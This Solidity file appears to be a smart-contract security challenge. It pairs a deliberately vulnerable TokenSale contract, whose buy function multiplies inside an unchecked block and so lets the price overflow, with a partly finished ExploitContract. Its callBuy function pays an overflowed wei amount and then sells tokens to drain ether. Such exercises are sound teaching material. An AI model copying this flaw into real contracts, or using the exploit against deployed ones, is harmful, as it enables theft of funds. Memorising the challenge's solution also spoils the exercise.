// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract TokenSale {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;
    event BalanceNow(uint256 balance);

    constructor() payable {
        require(msg.value == 1 ether, "Requires 1 ether to deploy contract");
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable returns (uint256) {
        uint256 total = 0;
        unchecked {
            total += numTokens * PRICE_PER_TOKEN;
        }
        require(msg.value == total, "not enount msg value");

        balanceOf[msg.sender] += numTokens;
        emit BalanceNow(balanceOf[msg.sender]);
        return (total);
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens, "not enough balance");

        balanceOf[msg.sender] -= numTokens;
        (bool ok, ) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
        require(ok, "Transfer to msg.sender failed");
    }
}

// Write your exploit contract below
contract ExploitContract {
    TokenSale public tokenSale;
    uint256 constant PRICE_PER_TOKEN = 1 ether;
    uint256 count;
    constructor(TokenSale _tokenSale) {
        tokenSale = _tokenSale;
    }

    receive() external payable {
        //    tokenSale.sell(5);
        // if(count<2){
        //     tokenSale.buy(1);
        //     tokenSale.sell(1);
        //     count++;
        // }
   
    }
    // write your exploit functions below
    fallback() external payable{
         
      
    }
    function callBuy(uint256 numTokens) external payable returns(uint256){
        uint256 total = tokenSale.buy{value: 415992086870360064 }(numTokens);
        tokenSale.sell(1);
        return total;
    }
}
